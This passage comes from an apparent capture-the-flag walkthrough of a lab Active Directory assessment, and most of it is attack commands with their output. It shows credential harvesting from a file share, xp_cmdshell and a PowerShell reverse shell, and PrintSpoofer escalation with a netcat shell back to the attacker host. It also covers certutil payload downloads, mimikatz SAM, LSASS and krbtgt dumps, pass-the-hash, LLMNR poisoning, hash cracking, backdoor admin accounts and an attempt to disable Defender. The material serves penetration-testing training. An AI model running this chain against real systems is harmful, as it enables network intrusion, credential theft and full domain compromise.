ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC

sudo crackmapexec smb 172.16.7.3 -u ****** -p Welcome1 --shares

SMB         172.16.7.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\BR086:Welcome1 
SMB         172.16.7.3      445    DC01             [*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Department Shares READ            Share for department users
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 


# Hey you! What do you have for me?
sudo crackmapexec smb 172.16.7.3 -u ****** -p Welcome1 -M spider_plus --share 'Department Shares'

...
SPIDER_PLUS 172.16.7.3      445    DC01             [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/172.16.7.3.json".
SPIDER_PLUS 172.16.7.3      445    DC01             [*] SMB Shares:           6 (ADMIN$, C$, Department Shares, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 172.16.7.3      445    DC01             [*] SMB Readable Shares:  4 (Department Shares, IPC$, NETLOGON, SYSVOL)
...

# Read the file
open /tmp/nxc_hosted/nxc_spider_plus/172.16.7.3.json 

{
    "Department Shares": {
        "IT/Private/Development/web.config": {
            "atime_epoch": "2022-04-01 10:04:06",
            "ctime_epoch": "2022-04-01 10:04:06",
            "mtime_epoch": "2022-04-01 10:05:02",
            "size": "1.17 KB"
        }
    },
...

# Connect to download
smbclient '//172.16.7.3/Department Shares' -U ******
Password for [WORKGROUP\BR086]:

Try "help" to get a list of possible commands.
smb: \> cd IT\
smb: \IT\> cd Private\Development\
smb: \IT\Private\Development\> ls
.                                   D        0  Fri Apr  1 10:04:07 2022
..                                  D        0  Fri Apr  1 10:04:07 2022
web.config                          A   ~  1203  Fri Apr  1 10:04:05 2022

10328063 blocks of size 4096. 8142515 blocks available
smb: \IT\Private\Development\> get web.config 
getting file \IT\Private\Development\web.config of size 1203 as web.config (4.4 KiloBytes/sec) (average 4.4 KiloBytes/sec)
smb: \IT\Private\Development\> exit


# Read the file
open web.config 

<connectionStrings>
   <add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>
</connectionStrings>
```


7. Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.

```sh
# SQL01 = 60.   Can we get a session with those?
sudo crackmapexec smb 172.16.7.3 -u netdb -p 'D@ta_bAse_adm1n!'

...
SMB         172.16.7.3      445    DC01             [-] INLANEFREIGHT.LOCAL\netdb:D@ta_bAse_adm1n! STATUS_LOGON_FAILURE


sudo crackmapexec smb 172.16.7.60 -u netdb -p 'D@ta_bAse_adm1n!'

...
SMB         172.16.7.60     445    SQL01            [-] INLANEFREIGHT.LOCAL\netdb:D@ta_bAse_adm1n! STATUS_LOGON_FAILURE


# Spray the new password while I going to chase stuffs
./kerbrute_linux_amd64 passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt 'D@ta_bAse_adm1n!'

...
2025/05/13 21:50:02 >  Done! Tested 2902 logins (0 successes) in 90.710 seconds

# Pure guess that this is a Windows machine. So, let's try to get a shell
impacket-mssqlclient -p 1433 netdb@172.16.7.60

Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Password: # D@ta_bAse_adm1n!
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (netdb  dbo@master)> 


# Check the DBs.
SQL (netdb  dbo@master)> SELECT name FROM master.dbo.sysdatabases
name     
------   
master   
tempdb   
model    
msdb     
SQL (netdb  dbo@master)> 


# No custom DB. Are we sysadmin?
SQL (netdb  dbo@master)> SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')
        
-----   
netdb   
    1   


# Yes. Can we XP_CMD shells?
SQL (netdb  dbo@master)> EXECUTE sp_configure 'show advanced options', 1
INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (netdb  dbo@master)> RECONFIGURE

SQL (netdb  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1
INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.

SQL (netdb  dbo@master)> RECONFIGURE


# Try to read the flag using the master db
SQL (netdb  dbo@master)> use master
ENVCHANGE(DATABASE): Old Value: master, New Value: master
INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
SQL (netdb  dbo@master)> 


# Test Command execution
SQL (netdb  dbo@master)> EXEC xp_cmdshell 'whoami /all'

USER INFORMATION                                                         
----------------                                                                                             

User Name                   SID  ===============================================================          
nt service\mssql$sqlexpress S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133                             

GROUP INFORMATION                                                        
-----------------                                                                                                       
Group Name                 Type             SID          Attributes      
================== ================ ============ ====================   
Mandatory Label\High Mandatory Level Label            S-1-16-12288       
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group   

BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558 Mandatory group, Enabled by default, Enabled group   
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group   
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group   
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group   
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group   
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group   
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group   
NT SERVICE\ALL SERVICES              Well-known group S-1-5-80-0   Mandatory group, Enabled by default, Enabled group   


PRIVILEGES INFORMATION                                                   ----------------------                                                                                                  
Privilege Name           Description                           State     
======================= ====================================== ========  
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled                                        
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled                                        
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                                         
SeImpersonatePrivilege        Impersonate a client after authentication Enabled                                         
SeCreateGlobalPrivilege       Create global objects                     Enabled                                         
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled                                        


# Where am I?
SQL (netdb  dbo@master)> EXEC xp_cmdshell 'hostname'
output   
------   
SQL01  


# Can we read the flag?
xp_cmdshell type C:\Users\Administrator\Desktop\flag.txt

output              
-----------------   
Access is denied.   


# I feel like we need to escalate from this given the SeImpersonatePrivilege. Can I reverse shell from the sql? Add a listener in ligolo for reverse shells
[Agent : htb-student@skills-par01] » listener_add --addr 0.0.0.0:7777 --to 0.0.0.0:53
INFO[5077] Listener 0 created on remote agent!


# Find a payload on revshells.com, Powershell #3 (Base64)
IP: 172.16.7.240
Port: 7777
Shell: Powershell


# Start the listener on Pwnbox
sudo ncat -lvnp 53
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:53
Ncat: Listening on 0.0.0.0:53


# In mssql shell, run the payload
SQL (netdb  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAd...MAZQAoACkA'


# If everything goes well, receive a shell in the listener
sudo ncat -lvnp 53
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 127.0.0.1:54840.

PS C:\Windows\system32> whoami
nt service\mssql$sqlexpress
PS C:\Windows\system32> 


# Add a listener to upload one of the potatoes given that the user has a SEImpersonate privilege
[Agent : htb-student@skills-par01] » listener_add --addr 0.0.0.0:3333 --to 127.0.0.1:8000
INFO[5525] Listener 1 created on remote agent!  


# Download Printspoofer
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

# Find nc.exe  and stage
locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe

cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .

python3 -m http.server 8000


# On SQL01
cd C:\Users\Public

certutil -urlcache -f http://172.16.7.240:3333/PrintSpoofer64.exe PrintSpoofer64.exe
certutil -urlcache -f http://172.16.7.240:3333/nc.exe nc.exe

****  Online  ****
CertUtil: -URLCache command completed successfully.

# Test
.\PrintSpoofer64.exe
[-] Please specify a command to execute
PS C:\users\Public> 


# Start listnener
sudo ncat -lvnp 53


# Escalate?
.\PrintSpoofer.exe -c ".\nc.exe 172.16.7.240 7777 -e cmd"


# Failed. Try the full path?
C:\Users\Public\PrintSpoofer64.exe -c "C:\Users\Public\nc.exe 172.16.7.240 7777 -e cmd"


# FINALLY!!!!!!!
sudo ncat -lvnp 53
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 127.0.0.1:44288.
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

dir C:\Users\Administrator\Desktop>


 Directory of C:\Users\Administrator\Desktop

04/11/2022  10:32 PM    <DIR>          .
04/11/2022  10:32 PM    <DIR>          ..
04/11/2022  10:33 PM                21 flag.txt
               1 File(s)             21 bytes
               2 Dir(s)  17,229,225,984 bytes free

# Read the flag
type C:\Users\Administrator\Desktop>flag.txt

******

```


8.  Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.

```sh
# Dump the SAM
PS C:\> reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\sam C:\sam.save
The operation completed successfully.
PS C:\> reg.exe save hklm\system C:\system.save
reg.exe save hklm\system C:\system.save
The operation completed successfully.
PS C:\> reg.exe save hklm\security C:\security.save
reg.exe save hklm\security C:\security.save
The operation completed successfully.


# Transfer to our machine. Add a listener to update files
listener_add --addr 0.0.0.0:6666 --to 0.0.0.0:80


# Fais chier. I am system. I can Add users and enable everything I want
C:\>net user gt lab123 /add
net user gt lab123 /add
The command completed successfully.


C:\>net localgroup Administrators gt /add
net localgroup Administrators gt /add
The command completed successfully.


# Enable RDP
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
The operation completed successfully.

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 

Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true

# Last command failed but can log in?
xfreerdp /u:gt /p:lab123 /v:172.16.7.60 /size:80% +clipboard 


# Ok. My Attempts to transfer using UI failed. Would B64 work?
[Convert]::ToBase64String((Get-Content -path "C:\sam.save" -Encoding byte))


# Nope. Too large. Transfer Mimikatz?
xfreerdp /u:gt /p:lab123 /v:172.16.7.60 /size:80% +clipboard

```

Targets died. It's 10PM. I will continue on 05/14/2025.

# Resuming on 05/15/2025

```sh
# Repeat the steps above, download and transfer mimikatz
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip

certutil -urlcache -f http://172.16.7.240:30000/PrintSpoofer64.exe PrintSpoofer64.exe

certutil -urlcache -f http://172.16.7.240:30000/nc.exe nc.exe
certutil -urlcache -f http://172.16.7.240:30000/mimikatz_trunk.zip mimikatz_trunk.zip


# From the reverse shell session in SQL01 as System, dump the sam
 .\mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::sam
Domain : SQL01
SysKey : 2cdbbee2d1fb9cfb7cf7189fa66971a6
Local SID : S-1-5-21-3827174835-953655006-33323432

SAMKey : 1f3713f605ea38af43344dc944dea5ce

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 136b3ddfbb62cb02e53a8f661248f364

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 81758876d60e11231820a371178e3530

* Primary:Kerberos-Newer-Keys *
    Default Salt : SQL01.INLANEFREIGHT.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : ebac626a2675b1b19821f89b42bf783f458b11578aa6d94a7d9d3baebdcf0b6e
      aes128_hmac       (4096) : c4006bb6f49cd841aa764621e0fbbf5d
      des_cbc_md5       (4096) : 45b0c16d26cd29e5
    OldCredentials
      aes256_hmac       (4096) : a6b660de661c6a558a414560082262069223fb9815fab1f08169e0bb3954bc10
      aes128_hmac       (4096) : da03dd69f9d316baf21d16bb0639a559
      des_cbc_md5       (4096) : ef9898bf10c754b5
    OlderCredentials
      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
      des_cbc_md5       (4096) : 9876615285c2766e
...

mimikatz # sekurlsa::logonpasswords

...
Authentication Id : 0 ; 230242 (00000000:00038362)
Session           : Interactive from 1
User Name         : mssqlsvc
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 5/17/2025 8:07:30 AM
SID               : S-1-5-21-3327542485-274640656-2609762496-4613
	msv :	
	 [00000003] Primary
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 8c9555327d95f815987c0d81238c7660
	 * SHA1     : 0a8d7e8141b816c8b20b4762da5b4ee7038b515c
	 * DPAPI    : a1568414db09f65c238b7557bc3ceeb8
	tspkg :	
	wdigest :	
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT
	 * Password : (null)
	kerberos :	
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
...

# We have the mssqlsvc hash. Can we crack?
cat mssqlsvc.hash 
8c9555327d95f815987c0d81238c7660

hashcat -m 1000 mssqlsvc.hash /usr/share/wordlists/rockyou.txt --force -O

...
Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 8c9555327d95f815987c0d81238c7660
Time.Started.....: Sat May 17 08:55:39 2025, (3 secs)
Time.Estimated...: Sat May 17 08:55:42 2025, (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
...


# FAILED!!! Can we PtH to MS01?
impacket-psexec mssqlsvc@172.16.7.50 -hashes :8c9555327d95f815987c0d81238c7660

...
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> dir C:\Users\Administrator\Desktop


 Directory of C:\Users\Administrator\Desktop

04/11/2022  10:32 PM    <DIR>          .
04/11/2022  10:32 PM    <DIR>          ..
04/11/2022  10:32 PM                24 flag.txt
               1 File(s)             24 bytes
               2 Dir(s)  18,974,515,200 bytes free

type C:\Users\Administrator\Desktop\flag.txt
******
```


8. Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?

```sh
# The hint says think about how you obtain initial foothold. That was LMNNR. Will inveigh work with the UI now?
wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/refs/heads/master/Inveigh.ps1

python3 -m http.server 8000

# On MS01 target
C:\Users\Public> certutil -urlcache -f http://172.16.7.240:30000/Inveigh.ps1 Inveigh.ps1

****  Online  ****
CertUtil: -URLCache command completed successfully.

# Switch to the RDP session and attempt to run
import-module .\Inveigh.ps1

Invoke-Inveigh Y -NBNS Y -mDNS Y -Proxy Y -ConsoleOutput Y -FileOutput Y -IP 172.16.7.50


# Seems to work with GUI. Let it run for a minute. Not hashes captured. Try the C# version
wget https://github.com/Kevin-Robertson/Inveigh/releases/download/v2.0.11/Inveigh-net8.0-win-x64-trimmed-single-v2.0.11.zip

python3 -m http.server 80

# On target
C:\Users\Public> certutil -urlcache -f http://172.16.7.240:30000/Inveigh-net8.0-win-x64-trimmed-single-v2.0.11.zip Inveigh-net8.0-win-x64-trimmed-single-v2.0.11.zip


# Use the rdp session to unzip. Check if it works
.\Inveigh.exe -?


# Start powershell as admin. Run
.\Inveigh.exe


# After a few minutes, we should see hashes comming in
PS C:\Users\Public\Inve> .\Inveigh.exe
[*] Inveigh 2.0.11 [Started 2025-05-17T10:02:24 | PID 5080]
[+] Packet Sniffer Addresses [IP 172.16.7.50 | IPv6 fe80::f903:116e:4764:b518%9]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.7.50 | IPv6 fe80::f903:116e:4764:b518%9]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Users\Public\Inve]
[+] Previous Session Files (Not Found)
[*] Press ESC to enter/exit interactive console
[.] [10:03:51] TCP(445) SYN packet from 172.16.7.3:65248
[.] [10:03:51] SMB1(445) negotiation request detected from 172.16.7.3:65248
[.] [10:03:51] SMB2+(445) negotiation request detected from 172.16.7.3:65248
[+] [10:03:51] SMB(445) NTLM challenge [08AA57E4B34DBA08] sent to 172.16.7.50:65248
[+] [10:03:51] SMB(445) NTLMv2 captured for [INLANEFREIGHT\CT059] from 172.16.7.3(DC01):65248:
******::INLANEFREIGHT:08AA57E4B34DBA08:7436B35AB1FDDC0101EA76FE353D5E53:01010000000000000328...000000
[!] [10:03:51] SMB(445) NTLMv2 for [INLANEFREIGHT\CT059] written to Inveigh-NTLMv2.txt
...
[+] [10:04:02] SMB(445) NTLMv2 captured for [INLANEFREIGHT\AB920] from 172.16.7.3(DC01):65252:
AB920::INLANEFREIGHT:68AA582D46640F91:3DB7FB980158BC4589BB0764E0EA3DB6:01010000000...000000000
[!] [10:04:02] SMB(445) NTLMv2 for [INLANEFREIGHT\AB920] written to Inveigh-NTLMv2.txt
[ ] [10:04:02] NBNS(20) request [INLANEFRIGHT] from 172.16.7.3 [disabled]


# We know AB920. Our OG. The new one here is ******. 
```


9.  Crack this user's password hash and submit the cleartext password as your answer.

```sh
# Repeats the steps from question 1.
******::INLANEFREIGHT:08AA57E4B34DBA08:7436B35AB1FDDC0101EA76FE353D5E53:01010000000...00000000

hashcat -m 5600 ******_ntlmv2 /usr/share/wordlists/rockyou.txt --force -O

******::INLANEFREIGHT:08aa57e4b34dba08:7436b35ab1fddc0101ea76fe353d5e53:0101000000...0000000000000000:******

# Verify credentials against DC
sudo crackmapexec smb 172.16.7.3 -u ****** -p ******

SMB         172.16.7.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\CT059:charlie1 
```


10. Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.

```sh
# Since we have generic all over the Domain Admins group, we can just add ourselves to that group? How can we log in and where?
sudo crackmapexec smb 172.16.7.3 -u ****** -p ******

# Failed. RDP on MS01?
xfreerdp /u:****** /p:****** /v:172.16.7.50 /size:80% +clipboard 

# Worked. Who is currently domain admin?
 net group "Domain Admins" /domain
The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.

# Add ourselves?
PS C:\Users\******> net group "Domain Admins" ****** /add /domain

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

The command completed successfully.

# Verify
PS C:\Users\******> net group "Domain Admins" /domain


Members
-------------------------------------------------------------------------
Administrator            ******
The command completed successfully.


# Log into the domain admin from Kali
impacket-psexec INLANEFREIGHT.LOCAL/******:******@172.16.7.3

...
C:\Users> whoami
nt authority\system

# Read the flag
type C:\Users\Administrator\Desktop\flag.txt
******
```


11. Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.

```sh
# Given that I am domain admin, I can dump it remotely?
crackmapexec smb 172.16.7.3 --local-auth -u ****** -p ****** --lsa

# Nope. RDP failed too. Backdoor 
C:\>net user gt lab123 /add
C:\>net localgroup Administrators gt /add

# Enable RDP
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
The operation completed successfully.

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 

Enable-NetFirewallRule -DisplayGroup "Remote Desktop"


# Stage and download mimikatz on DC
python3 -m http.server 8000

certutil -urlcache -f http://172.16.7.240:30000/mimikatz_trunk.zip mimikatz_trunk.zip


# Log in and extract archives
xfreerdp /u:gt /p:lab123 /v:172.16.7.3 /size:80% +clipboard 


# Nope. This is pure server. So, I need a workaround on the PSExec session
Expand-Archive -Path "C:\users\Public\mimikatz_trunk.zip" -DestinationPath "C:\users\Public\mimi"


# Run mimikatz
.\mimikatz.exe
privilege::debug
token::elevate

# Get the krbtgt hash
lsadump::lsa /patch
mimikatz # Domain : INLANEFREIGHT / S-1-5-21-3327542485-274640656-2609762496

RID  : 000001f4 (500)
User : Administrator
LM   : 
NTLM : 234a798328eb83fda24119597ffba70b

RID  : 000001f6 (502)
User : krbtgt
LM   : 
NTLM : 7eba70412d81c1cd030d72a3e8dbe05f
...
```
